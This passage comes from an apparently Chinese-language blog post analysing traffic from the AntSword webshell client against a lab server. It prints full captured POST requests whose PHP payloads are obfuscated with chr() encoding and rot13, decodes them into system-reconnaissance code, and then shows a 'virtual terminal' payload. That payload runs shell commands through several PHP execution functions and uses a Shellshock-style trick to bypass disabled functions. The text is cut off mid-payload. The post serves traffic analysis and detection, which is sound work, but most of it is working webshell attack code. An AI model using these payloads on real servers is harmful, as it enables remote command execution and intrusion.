class="line">cmd&#x3D;%40eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(36).ChR(111).ChR(117).ChR(116).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(49).ChR(55).ChR(99).ChR(54).ChR(56).ChR(54).ChR(48).ChR(100).ChR(56).ChR(55).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(101).ChR(51).ChR(57).ChR(57).ChR(99).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).ChR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59))%3B</span><br></pre></td></tr></table></figure>

<p>可以看到命令是通过chr拼接的，chr16是16位的，和这个类似如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6462</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40eVAl(cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x64).ChR(0x69).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x65).ChR(0x72).ChR(0x72).ChR(0x6f).ChR(0x72).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x5f).ChR(0x6c).ChR(0x69).ChR(0x6d).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x30).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x7b).ChR(0x72).ChR(0x65).ChR(0x74).ChR(0x75).ChR(0x72).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x3d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x5f).ChR(0x63).ChR(0x6c).ChR(0x65).ChR(0x61).ChR(0x6e).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x33).ChR(0x65).ChR(0x32).ChR(0x35).ChR(0x62).ChR(0x36).ChR(0x63).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x40).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x61).ChR(0x37).ChR(0x35).ChR(0x61).ChR(0x38).ChR(0x38).ChR(0x61).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x73).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x74).ChR(0x72).ChR(0x79).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x3d).ChR(0x22).ChR(0x22).ChR(0x29).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x50).ChR(0x41).ChR(0x54).ChR(0x48).ChR(0x5f).ChR(0x54).ChR(0x52).ChR(0x41).ChR(0x4e).ChR(0x53).ChR(0x4c).ChR(0x41).ChR(0x54).ChR(0x45).ChR(0x44).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x7d).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x2c).ChR(0x30).ChR(0x2c).ChR(0x31).ChR(0x29).ChR(0x21).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x7b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x72).ChR(0x61).ChR(0x6e).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x43).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x5a).ChR(0x22).ChR(0x29).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x4c).ChR(0x29).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x7b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x75).ChR(0x3d).ChR(0x28).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x22).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x67).ChR(0x69).ChR(0x64).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x3f).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x70).ChR(0x77).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3a).ChR(0x22).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x73).ChR(0x3d).ChR(0x28).ChR(0x24).ChR(0x75).ChR(0x29).ChR(0x3f).ChR(0x24).ChR(0x75).ChR(0x5b).ChR(0x22).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x22).ChR(0x5d).ChR(0x3a).ChR(0x40).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x75).ChR(0x72).ChR(0x72).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x5f).ChR(0x75).ChR(0x73).ChR(0x65).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x70).ChR(0x68).ChR(0x70).ChR(0x5f).ChR(0x75).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x7b).ChR(0x24).ChR(0x73).ChR(0x7d).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x3b).ChR(0x7d).ChR(0x63).ChR(0x61).ChR(0x74).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x45).ChR(0x78).ChR(0x63).ChR(0x65).ChR(0x70).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x65).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x65).ChR(0x2d).ChR(0x3e).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x4d).ChR(0x65).ChR(0x73).ChR(0x73).ChR(0x61).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x64).ChR(0x69).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b))%3B</span><br></pre></td></tr></table></figure>

<p>测试rot13</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 1064</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40eval(%40str_rot13(%24_POST%5Bm3fad46e15e6b5%5D))%3B&amp;m3fad46e15e6b5&#x3D;%40vav_frg(%22qvfcynl_reebef%22%2C%20%220%22)%3B%40frg_gvzr_yvzvg(0)%3Bshapgvba%20nfrap(%24bhg)%7Berghea%20%24bhg%3B%7D%3Bshapgvba%20nfbhgchg()%7B%24bhgchg%3Dbo_trg_pbagragf()%3Bbo_raq_pyrna()%3Brpub%20%223on4r1q%22%3Brpub%20%40nfrap(%24bhgchg)%3Brpub%20%22sps90147n686%22%3B%7Dbo_fgneg()%3Bgel%7B%24Q%3Dqveanzr(%24_FREIRE%5B%22FPEVCG_SVYRANZR%22%5D)%3Bvs(%24Q%3D%3D%22%22)%24Q%3Dqveanzr(%24_FREIRE%5B%22CNGU_GENAFYNGRQ%22%5D)%3B%24E%3D%22%7B%24Q%7D%09%22%3Bvs(fhofge(%24Q%2C0%2C1)!%3D%22%2F%22)%7Bsbernpu(enatr(%22P%22%2C%22M%22)nf%20%24Y)vs(vf_qve(%22%7B%24Y%7D%3A%22))%24E.%3D%22%7B%24Y%7D%3A%22%3B%7Dryfr%7B%24E.%3D%22%2F%22%3B%7D%24E.%3D%22%09%22%3B%24h%3D(shapgvba_rkvfgf(%22cbfvk_trgrtvq%22))%3F%40cbfvk_trgcjhvq(%40cbfvk_trgrhvq())%3A%22%22%3B%24f%3D(%24h)%3F%24h%5B%22anzr%22%5D%3A%40trg_pheerag_hfre()%3B%24E.%3Dcuc_hanzr()%3B%24E.%3D%22%09%7B%24f%7D%22%3Brpub%20%24E%3B%3B%7Dpngpu(Rkprcgvba%20%24r)%7Brpub%20%22REEBE%3A%2F%2F%22.%24r-%3EtrgZrffntr()%3B%7D%3Bnfbhgchg()%3Bqvr()%3B</span><br></pre></td></tr></table></figure>

<p>url解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;@eval(@str_rot13($_POST[m3fad46e15e6b5]));</span><br><span class="line">m3fad46e15e6b5&#x3D;@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg)&#123;erghea $bhg;&#125;;shapgvba nfbhgchg()&#123;$bhgchg&#x3D;bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;3on4r1q&quot;;rpub @nfrap($bhgchg);rpub &quot;sps90147n686&quot;;&#125;bo_fgneg();gel&#123;$Q&#x3D;qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q&#x3D;&#x3D;&quot;&quot;)$Q&#x3D;qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E&#x3D;&quot;&#123;$Q&#125;	&quot;;vs(fhofge($Q,0,1)!&#x3D;&quot;&#x2F;&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.&#x3D;&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.&#x3D;&quot;&#x2F;&quot;;&#125;$E.&#x3D;&quot;	&quot;;$h&#x3D;(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f&#x3D;($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.&#x3D;cuc_hanzr();$E.&#x3D;&quot;	&#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE:&#x2F;&#x2F;&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr();</span><br></pre></td></tr></table></figure>

<p>rot13解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output&#x3D;ob_get_contents();ob_end_clean();echo &quot;3ba4e1d&quot;;echo @asenc($output);echo &quot;fcf90147a686&quot;;&#125;ob_start();try&#123;$d&#x3D;dirname($_server[&quot;script_filename&quot;]);if($d&#x3D;&#x3D;&quot;&quot;)$d&#x3D;dirname($_server[&quot;path_translated&quot;]);$r&#x3D;&quot;&#123;$d&#125;	&quot;;if(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot;)&#123;foreach(range(&quot;c&quot;,&quot;z&quot;)as $l)if(is_dir(&quot;&#123;$l&#125;:&quot;))$r.&#x3D;&quot;&#123;$l&#125;:&quot;;&#125;else&#123;$r.&#x3D;&quot;&#x2F;&quot;;&#125;$r.&#x3D;&quot;	&quot;;$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();$r.&#x3D;php_uname();$r.&#x3D;&quot;	&#123;$s&#125;&quot;;echo $r;;&#125;catch(exception $e)&#123;echo &quot;error:&#x2F;&#x2F;&quot;.$e-&gt;getmessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>

<p>代码跟之前的一模一样</p>
<h3 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h3><p>测试一个最简单的ls命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4019</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">c5980976ee6af&#x3D;&amp;cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2201fba%22%3Becho%20%40asenc(%24output)%3Becho%20%2278e6dcac%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(%24_POST%5B%22mbd5f87b32df2b%22%5D)%3B%24s%3Dbase64_decode(%24_POST%5B%22dd32c0973cea1a%22%5D)%3B%24envstr%3D%40base64_decode(%24_POST%5B%22c5980976ee6af%22%5D)%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#39;trim&#39;%2Carray_map(&#39;strtolower&#39;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#39;putenv&#39;)%20%26%26%20(fe(&#39;error_log&#39;)%20%7C%7C%20fe(&#39;mail&#39;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#39;as&#39;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#39;error_log&#39;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#39;system&#39;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#39;passthru&#39;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#39;shell_exec&#39;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#39;exec&#39;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#39;popen&#39;))%7B%24fp%3D%40popen(%24c%2C&#39;r&#39;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#39;proc_open&#39;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;)%2C%202%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7